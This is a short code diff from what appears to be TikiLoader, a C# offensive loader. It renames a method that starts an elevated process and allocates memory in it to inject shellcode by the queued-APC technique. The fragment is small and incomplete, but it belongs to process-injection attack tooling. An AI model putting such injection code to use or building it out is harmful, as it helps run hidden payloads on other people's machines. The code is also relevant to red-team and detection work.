@@ -130,7 +130,7 @@ namespace TikiLoader
             ResumeTargetThread(pinf.hThread);
         }
 
-        public static void QUAPCInject(string binary, int elevatedPid, byte[] shellcode)
+        public static void QUAPCInjectElevated(string binary, int elevatedPid, byte[] shellcode)
         {
             var pinf = StartElevatedProcess(binary, elevatedPid);
             var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
